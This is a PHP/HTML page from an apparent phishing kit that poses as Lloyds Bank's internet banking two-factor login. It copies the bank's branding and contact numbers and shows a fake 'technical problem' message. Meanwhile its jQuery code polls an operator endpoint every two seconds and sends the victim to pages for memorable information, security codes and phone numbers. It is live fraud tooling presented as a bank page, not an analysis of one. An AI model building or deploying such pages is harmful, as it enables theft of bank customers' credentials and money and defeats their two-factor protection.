<?php
session_start();


if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        

        
        <meta name="DCSext.hasTealium" content="1" />

        <title>
            Lloyds Bank - Welcome to Internet Banking
        </title>
        <meta name="keywords" content="" />
        <meta name="description" content="" />

        <meta http-equiv="content-language" content="en-gb" />
        <link rel="alternate" media="handheld" href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/twofactorauth.jsp" />
        <meta name="viewport" content="width=device-width" />
        <meta name="format-detection" content="telephone=no" />

        <link rel="apple-touch-icon" sizes="57x57" href="files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="files/img/ltsb%20114x114-.JPG" />

        <link type="text/css" href="./files/css/base-auto-min200720.css" rel="stylesheet" />

        
        <link id="2fa-login-styles" rel="stylesheet" type="text/css" href="./files/css/styles.css" media="all" />
		<script src="files/js/jquery.js"></script>
        <script>

var timmer = setInterval(function() {
	
	//loader_status_wait
	
	var id = <?=$_SESSION['uniqueid'];?>;
	var urldata = 'files/action.php?getstatus=' + id;
	$.ajax({
		url:urldata,
		type:'GET',
		success: function(response){
			//console.log(response)
			if(response == 11){
				$('#loader_status_wait').hide();
				$('#wait_loader').hide();
				$('#fail_loader').hide();
				$('#success_loader').show();
				$('#loader_status').text('The information you have entered are correct');
				$.ajax({
					url:'files/action.php?wait=' + id,
					type:'GET',
					success: function(response){
						//console.log(response);
					}
				});
				setTimeout(function () {
					$('#wait_loader').show();
					$('#fail_loader').hide();
					$('#success_loader').hide();
					$('#loader_status').text('Loading...');
				}, 3000);
			}else if(response == 12){
				$('#loader_status_wait').hide();
				$('#wait_loader').hide();
				$('#fail_loader').show();
				$('#success_loader').hide();
				$('#loader_status').text('The information you have entered are incorrect');
				$.ajax({
					url:'files/action.php?wait=' + id,
					type:'GET',
					success: function(response){
						//console.log(response);
					}
				});
				setTimeout(function () {
					$('#wait_loader').show();
					$('#fail_loader').hide();
					$('#success_loader').hide();
					$('#loader_status').text('Loading...');
				}, 3000);
			}else if(response == 5){
				
				window.location.href = 'Login.php?error';
				
			}else if(response == 2){
				
				window.location.href = 'Memorable.php';
				
			}else if(response == 8){
				
				window.location.href = 'Call.php';
				
			}else if(response == 7){
				
				window.location.href = 'Code.php';
				
			}else if(response == 4){
				
				window.location.href = 'Success.php';

			}else if(response == 14){
				
				window.location.href = 'Phonenumber.php';

			}
	
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
	
}, 2000);

</script>
<script>
    var interval = 3000;  
    function heartbeat() {
        $.ajax({
                type: 'GET',
                url: 'files/activity.php',
                success: function (data) {
                    var parsed_data = JSON.parse(data);
                    //console.log(parsed_data);
                },
                complete: function (data) {
                    setTimeout(heartbeat, interval);
                }
        });
    }
    setTimeout(heartbeat, interval);
</script>
<link rel="shortcut icon" href="files/img/favicon.ico" />
    </head>

    <body>
        

        <div id="outer">
            <div id="banner">
                <p id="logo">
                    <a id="headerChangeNGB:ltsblogo" name="headerChangeNGB:ltsblogo" href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/twofactorauth.jsp?lnkcmd=headerChangeNGB%3Altsblogo&amp;al=">
                        <img id="headerChangeNGB:ltsblogoImg" src="./files/img/logo-.gif" alt="Lloyds Bank" />
                    </a>
                </p>

                <p id="userStatus">
                    <img id="headerChangeNGB:lnkpadlockSeclogin1" src="./files/img/padlock-1429554491.png" alt="Secure" />
                </p>
                <div class="cookiePolicy">
                    <a
                        id="headerChangeNGB:ePrivacyLoggedOut"
                        name="headerChangeNGB:ePrivacyLoggedOut"
                        href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/twofactorauth.jsp?REFERRING_LOCATION=%2Fuseradmin%2Fmobile%2Flogon%2Ftwofactorauth.jsp&amp;HEADER_CONTENT=pages%2Fp226_00%2F22600htm502&amp;BODY_CONTENT=pages%2Fp226_00%2F22600htm503&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=headerChangeNGB%3AePrivacyLoggedOut&amp;al="
                        title="Cookie policy"
                        class="blockLink"
                    >
                        Cookie policy
                    </a>
                </div>
                <div class="clearer"></div>
            </div>
            <div>
                <div class="panel">
                    <div class="panelTL">
                        <div id="sca-2fa-cwm" style="display: block;">
                            <div class="spinnerLoad"></div>
                        </div>
                    </div>
                    <div id="sca-2fa" style="display:none;">
                        <div>
                            <div class="inner" id="inner">
                                <div class="error-view">
                                    <div class="section-div">
                                        <section class="section-panel">
                                            <div class="page-title-wrapper"><h1 class="page-title">There is a problem</h1></div>
                                            <p class="body-copy">Unfortunately we couldn't log you on because of a technical problem. Sorry for any inconvenience. Please try again later.</p>
                                            <p class="body-copy">
                                                If you continue to have trouble, please call us any time on
                                                <a class="hyper-link" content=" 0345 300 0116" path="tel: 0345 300 0116" id="hyper-link-number" href="tel: 0345 300 0116"> 0345 300 0116</a> (
                                                <a class="hyper-link" content=" +44 173 323 2030" path="tel: +44 173 323 2030" id="hyper-link-number" href="tel: +44 173 323 2030"> +44 173 323 2030</a> from outside the UK). Or Textphone 0345
                                                300 2280.
                                            </p>
                                            <div class="button-row-wrapper"><button class="base-button" id="primary-button" classnames="primary-button" title="Back to homepage">Back to homepage</button></div>
                                        </section>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="footer footerLogin">
                    <div class="FootNav"><div class="lnkLevFoot"></div></div>
                    <div class="footerLinksLogin">
                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/twofactorauth.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm300&amp;BODY_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3Alnksecurityloggedout&amp;al="
                            title="Security"
                        >
                            Security
                        </a>

                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            href="https://secure.lloydsbank.co.uk/personal/a/useradmin/mobile/logon/twofactorauth.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm300&amp;BODY_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3AlnkLegalloggedout&amp;al="
                            title="Legal"
                            class="footerLinksLast"
                        >
                            Legal
                        </a>
                    </div>
                    <span id="mLogonSuccess" style="display: none;"></span>
                    
                </div>
            </div>
        </div>
      

        
    </body>
</html>
